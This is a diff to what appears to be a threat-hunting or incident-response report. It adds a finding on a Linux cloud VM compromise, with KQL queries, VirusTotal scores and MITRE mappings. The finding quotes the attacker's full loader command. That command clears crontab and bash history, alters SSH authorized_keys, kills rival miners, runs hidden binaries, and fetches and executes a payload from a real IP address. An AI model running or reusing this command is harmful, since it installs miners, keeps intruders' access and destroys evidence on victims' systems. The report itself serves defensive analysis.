@@ -280,6 +280,76 @@ DeviceFileEvents
 
 ---
 
+### 🔎 Finding #5 — Execution of `./network` Loader and Obfuscation Script
+
+**Command Observed:**
+```bash
+./network "rm -rf /var/tmp/Documents ; \
+mkdir /var/tmp/Documents 2>&1 ; \
+crontab -r ; \
+chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; \
+cd /var/tmp ; \
+chattr -iae /var/tmp/Documents/.diicot ; \
+pkill Opera ; pkill cnrig ; pkill java ; killall java ; \
+pkill xmrig ; killall cnrig ; killall xmrig ; \
+cd /var/tmp/ ; \
+mv /var/tmp/diicot /var/tmp/Documents/.diicot ; \
+mv /var/tmp/kuak /var/tmp/Documents/kuak ; \
+cd /var/tmp/Documents ; \
+chmod +x .* ; \
+/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; \
+history -c ; \
+rm -rf .bash_history ~/.bash_history ; \
+rm -rf /tmp/cache ; \
+cd /tmp/ ; \
+wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; \
+mv .balu cache ; \
+chmod +x cache ; \
+./cache >/dev/null 2>&1 & disown ; \
+history -c ; \
+rm -rf .bash_history ~/.bash_history"
+```
+
+**Associated Device:**  
+`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+**Timeframe:**  
+
+`March 14, 2025 @ 16:41 UTC`
+<!--
+*March 17, 2025 @ 12:36 UTC* → *March 17, 2025 @ 13:03 UTC*
+-->
+
+**Behavior Observed:**  
+- `./network` acts as a loader, executing `.diicot`, `.kuak`, and later `cache` (from downloaded `.balu`)  
+- Replaces `/var/tmp/Documents/` with a controlled drop site  
+- Clears bash history, kills known miners, and resets SSH authorized_keys  
+- Obfuscates execution paths using hidden directories and file renaming
+
+**Query Used:**
+```kql
+DeviceProcessEvents
+| where InitiatingProcessFileName =~ "network"
+| where FolderPath contains "/var/tmp"
+| project Timestamp, DeviceName, InitiatingProcessCommandLine
+```
+
+> 🖼️ *Insert Screenshot: Process tree showing `./network` and resulting sub-processes*
+
+**VirusTotal Scores:**  
+- `.diicot`: `21/64` — Likely crypto miner  
+- `.balu` (renamed to `cache`): `33/64` — Likely loader or second-stage dropper  
+
+**Likely Role:**  
+Loader and cleanup utility to obscure prior execution and enable long-term activity
+
+**Mapped MITRE Techniques:**  
+- `T1059` — Command and Scripting Interpreter  
+- `T1070.004` — Indicator Removal: File Deletion  
+- `T1036` — Masquerading  
+- `T1564.001` — Hidden Files and Directories
+
+<!--
 ### Finding #5 — Exfiltration via Silent `curl` Request
 
 **Indicator:**  
@@ -355,7 +425,7 @@ DeviceProcessEvents
 **Mapped MITRE Techniques:**  
 - `T1059` — Command and Scripting Interpreter  
 - `T1105` — Ingress Tool Transfer
-
+-->
 ---
 
 
